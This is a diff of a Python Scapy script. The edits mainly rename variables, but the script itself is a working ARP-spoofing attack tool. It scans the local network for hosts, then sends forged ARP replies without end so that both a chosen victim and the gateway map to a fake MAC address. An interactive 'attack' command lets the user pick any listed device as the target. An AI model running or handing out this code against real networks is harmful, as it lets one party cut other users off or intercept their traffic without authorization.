@@ -22,34 +22,35 @@ def get_gw_and_network():
 	network = '.'.join(a) + "/24"
 
 def scan_network(network):
-	global lsts
+	global list_address
 	print("Scanning Network...")
 	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network), timeout=2.5, verbose=0)
-	lsts = []
-	for i in range(len(ans)):
-		ip = ans[i][1].psrc
-		mac = ans[i][1].hwsrc
-		lsts.append([ip, mac])
+	list_address = []
+	for i in ans:
+		ip = i[1].psrc
+		mac = i[1].hwsrc
+		list_address.append([ip, mac])
+	
 	print('-'*110)
 	print("Target ID\tIP\t\t\tMAC\t\t\t\tDevices")
-	for j in range(len(lsts)):
-		ip = lsts[j][0]
-		mac = lsts[j][1]
+	for i in range(len(list_address)):
+		ip = list_address[i][0]
+		mac = list_address[i][1]
 		try:
 			device_name = MacLookup().lookup(mac)
 		except:
 			device_name = "Unknow"
-		print("[ %s ]\t\t%s\t\t%s\t\t%s" % (j, ip, mac, device_name))
+		print("[ %s ]\t\t%s\t\t%s\t\t%s" % (i, ip, mac, device_name))
 	print('-'*110)
 
 def attack(choice_target):
 	mac_fake = "12:34:56:78:9A:BC"
-	target = lsts[choice_target]
-	packet = ARP(psrc=gw, hwsrc=mac_fake, pdst=target[0], hwdst=target[1], op=2)
+	target = list_address[choice_target]
+	packet_1 = ARP(psrc=gw, hwsrc=mac_fake, pdst=target[0], hwdst=target[1], op=2)
 	packet_2 = ARP(psrc=target[0], hwsrc=mac_fake, pdst=gw, hwdst=mac_gw, op=2)
 	print("[+] Attack %s !" % (target[0]))
 	while True:
-		send(packet, verbose=0)
+		send(packet_1, verbose=0)
 		send(packet_2, verbose=0)
 
 get_gw_and_network()
@@ -57,18 +58,18 @@ scan_network(network)
 print('r - refresh | a - attack | h - help | q - quit |')
 choice_option = input('Option> ')
 while True:
-	lst_choice = choice_option.split()
-	if lst_choice[0] == 'r':
+	list_choice = choice_option.split()
+	if list_choice[0] == 'r':
 		print()
 		scan_network(network)
-	elif lst_choice[0] == 'a':
+	elif list_choice[0] == 'a':
 		try:
-			choice_target = int(lst_choice[1])
+			choice_target = int(list_choice[1])
 			attack(choice_target)
 		except:
 			print('Attack: Usage option a with target id. Example: a 1')
 			print()
-	elif lst_choice[0] == 'h':
+	elif list_choice[0] == 'h':
 		print("""
 a	Attack with target id. Example: a 1
 c	Clear screen
@@ -76,9 +77,9 @@ r	Refresh network list
 q	Quit
 """)
 		print()
-	elif lst_choice[0] == 'q':
+	elif list_choice[0] == 'q':
 		break
-	elif lst_choice[0] == 'c':
+	elif list_choice[0] == 'c':
 		try:
 			subprocess.call('clear')
 		except:
